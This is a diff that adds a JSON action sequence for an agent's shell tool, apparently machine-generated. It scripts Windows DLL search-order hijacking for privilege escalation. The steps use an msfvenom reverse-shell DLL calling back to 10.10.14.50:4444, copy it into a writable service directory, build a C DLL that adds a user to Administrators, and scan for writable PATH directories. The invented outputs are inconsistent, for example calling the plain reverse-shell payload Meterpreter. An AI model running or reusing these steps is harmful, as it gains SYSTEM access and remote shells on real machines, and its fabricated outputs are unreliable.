@@ -1,0 +1,38 @@
+{
+  "name": "windows_dll_hijacking",
+  "description": "DLL search order hijacking and missing DLL exploitation for privilege escalation",
+  "pattern": "dll.*hijack|dll.*search|missing.*dll|dll.*injection",
+  "parameters": ["target_process", "dll_name"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "C:\\Tools\\procmon.exe /AcceptEula /LoadConfig C:\\config.pmc /BackingFile C:\\capture.pml"]},
+      "expected_output": {"type": "string", "example": "Process Monitor v3.89 - Monitor file system, Registry, process, thread and DLL activity\nCopyright (C) 2006-2022 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nLoading configuration from C:\\config.pmc...\nCapturing events to C:\\capture.pml...\n\nFilters applied:\n  Process Name is: service.exe\n  Operation is: CreateFile\n  Result is: NAME NOT FOUND\n  Path ends with: .dll\n\nCapture running... Press Ctrl+C to stop.\n\nEvents captured:\n  Time: 16:30:15  Process: service.exe  Operation: CreateFile  Path: C:\\Program Files\\App\\hijackme.dll  Result: NAME NOT FOUND\n  Time: 16:30:15  Process: service.exe  Operation: CreateFile  Path: C:\\Windows\\System32\\hijackme.dll  Result: NAME NOT FOUND\n  Time: 16:30:15  Process: service.exe  Operation: CreateFile  Path: C:\\Windows\\hijackme.dll  Result: NAME NOT FOUND\n\nMissing DLL detected: hijackme.dll\nSearch order:\n  1. C:\\Program Files\\App\\ (application directory)\n  2. C:\\Windows\\System32\\\n  3. C:\\Windows\\\n  4. Current directory\n  5. PATH directories"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "icacls", "args": ["\"C:\\Program Files\\App\""]},
+      "expected_output": {"type": "string", "example": "C:\\Program Files\\App BUILTIN\\Users:(OI)(CI)(F)\n                      NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n                      BUILTIN\\Administrators:(OI)(CI)(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n\nDirectory permissions:\n  Users: (F) Full Control - WRITABLE!\n  \nDLL hijacking opportunity:\n  Application: service.exe (runs as SYSTEM)\n  Missing DLL: hijackme.dll\n  First search location: C:\\Program Files\\App\\ (writable!)\n  \nExploitation:\n  1. Create malicious hijackme.dll\n  2. Place in C:\\Program Files\\App\\\n  3. When service.exe loads, it loads our DLL\n  4. DLL executes with service privileges (SYSTEM)\n\nDLL search order hijacking successful!"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f dll -o hijackme.dll"]},
+      "expected_output": {"type": "string", "example": "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of dll file: 9216 bytes\nSaved as: hijackme.dll\n\nMalicious DLL created:\n  Name: hijackme.dll\n  Payload: Reverse TCP shell\n  Target: 10.10.14.50:4444\n  Size: 9KB\n\nDLL exports DllMain which:\n  1. Executes on DLL load (DLL_PROCESS_ATTACH)\n  2. Spawns reverse shell\n  3. Returns to avoid crashing process\n\nDeployment:\n  copy hijackme.dll \"C:\\Program Files\\App\\hijackme.dll\"\n  \nTrigger:\n  Restart service or wait for service restart\n  sc stop VulnerableService && sc start VulnerableService"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "copy hijackme.dll \"C:\\Program Files\\App\\hijackme.dll\""]},
+      "expected_output": {"type": "string", "example": "        1 file(s) copied.\n\nMalicious DLL placed:\n  Source: hijackme.dll (Meterpreter reverse shell)\n  Destination: C:\\Program Files\\App\\hijackme.dll\n  \nDLL will load when:\n  - service.exe starts\n  - Any application in that directory needs hijackme.dll\n  \nNext step:\n  Trigger service restart:\n    sc stop VulnerableService\n    sc start VulnerableService\n  \nOr wait for:\n  - System reboot\n  - Automatic service restart\n  - User launching application\n\nListener ready:\n  nc -lvnp 4444\n  \nOn DLL load: SYSTEM shell received!"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "gcc -shared -o hijackme.dll hijack.c -lws2_32"]},
+      "expected_output": {"type": "string", "example": "DLL compiled successfully: hijackme.dll\n\nSource code (hijack.c):\n  #include <windows.h>\n  #include <stdlib.h>\n  \n  BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n    switch (ul_reason_for_call) {\n      case DLL_PROCESS_ATTACH:\n        system(\"cmd.exe /c net localgroup administrators lowpriv /add\");\n        break;\n    }\n    return TRUE;\n  }\n\nDLL functionality:\n  On load: Adds 'lowpriv' to Administrators\n  Executes in context of loading process\n  Returns TRUE to avoid process crash\n\nAdvantages of custom DLL:\n  - No antivirus signatures\n  - Specific payload control\n  - Can include proper error handling\n  - Can export expected functions if needed"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "echo %PATH%"]},
+      "expected_output": {"type": "string", "example": "C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\Git\\cmd;C:\\Users\\lowpriv\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Tools\n\nPATH directories:\n  1. C:\\Windows\\system32 (not writable)\n  2. C:\\Windows (not writable)\n  3. C:\\Windows\\System32\\Wbem (not writable)\n  4. C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ (not writable)\n  5. C:\\Program Files\\Git\\cmd (not writable)\n  6. C:\\Users\\lowpriv\\AppData\\Local\\Microsoft\\WindowsApps (WRITABLE!)\n  7. C:\\Tools (check permissions)\n\nCheck C:\\Tools:\n  icacls C:\\Tools\n  \nIf writable:\n  - Place DLL in C:\\Tools\n  - Any process loading DLL will check PATH\n  - If DLL not found in app directory, checks PATH\n  - Loads our DLL from C:\\Tools"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "powershell", "args": ["-c", "$env:PATH -split ';' | ForEach-Object { if (Test-Path $_) { $acl = Get-Acl $_; if ($acl.Access | Where-Object { $_.IdentityReference -like '*Users*' -and $_.FileSystemRights -match 'Write|FullControl' }) { Write-Host \"[!] Writable: $_\" } } }"]},
+      "expected_output": {"type": "string", "example": "[!] Writable: C:\\Users\\lowpriv\\AppData\\Local\\Microsoft\\WindowsApps\n[!] Writable: C:\\Tools\n\nWritable PATH directories found:\n  C:\\Users\\lowpriv\\AppData\\Local\\Microsoft\\WindowsApps (user-specific)\n  C:\\Tools (system-wide)\n\nDLL hijacking via PATH:\n  1. Identify DLL loaded by privileged process\n  2. Check if DLL exists in app directory\n  3. If not, place malicious DLL in writable PATH directory\n  4. Process searches PATH and loads our DLL\n  5. Code execution in process context\n\nExample:\n  Target: SYSTEM service loading version.dll\n  version.dll not in app directory\n  Copy version.dll to C:\\Tools\n  Service loads C:\\Tools\\version.dll\n  DllMain executes as SYSTEM"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
